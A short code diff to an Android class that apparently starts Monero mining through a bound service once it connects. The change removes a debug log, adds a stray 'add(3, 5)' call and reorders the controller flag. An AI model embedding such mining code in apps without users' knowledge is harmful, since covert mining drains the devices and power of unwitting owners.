@@ -10,7 +10,6 @@ import android.os.RemoteException;
 import java.io.ObjectStreamException;
 
 import waterhole.miner.core.AbstractMiner;
-import waterhole.miner.core.utils.LogUtils;
 
 public final class XmrMiner extends AbstractMiner {
 
@@ -22,11 +21,11 @@ public final class XmrMiner extends AbstractMiner {
         @Override
         public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
             try {
-                LogUtils.debug("huwwds", ">>>>>>>>>>>>>" + iBinder);
                 mServiceBinder = IMiningServiceBinder.MiningServiceBinder.asInterface(iBinder);
-                mServiceBinder.setControllerNeedRun(true);
+                mServiceBinder.add(3, 5);
                 mServiceBinder.startMine();
-            } catch (RemoteException e) {
+                mServiceBinder.setControllerNeedRun(true);
+            } catch (Exception e) {
                 e.printStackTrace();
             }
         }
